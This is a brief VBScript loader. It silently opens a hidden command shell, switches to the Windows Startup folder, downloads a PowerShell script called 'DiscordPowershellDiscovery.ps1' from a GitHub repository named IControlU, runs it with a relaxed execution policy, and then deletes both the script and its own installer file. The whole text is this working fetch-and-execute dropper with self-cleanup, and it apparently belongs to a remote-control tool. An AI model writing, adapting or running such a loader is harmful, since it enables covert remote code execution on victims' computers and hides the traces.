Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c @echo off & set CurrentDirectory=%CD% & set StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup & cd /d %StartupDirectory% & powershell -command ""Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"" & powershell -ExecutionPolicy RemoteSigned -File ""Discovery.ps1"" & del ""Discovery.ps1"" & cd /d %CurrentDirectory% & del ""Installer.cmd""", 0, False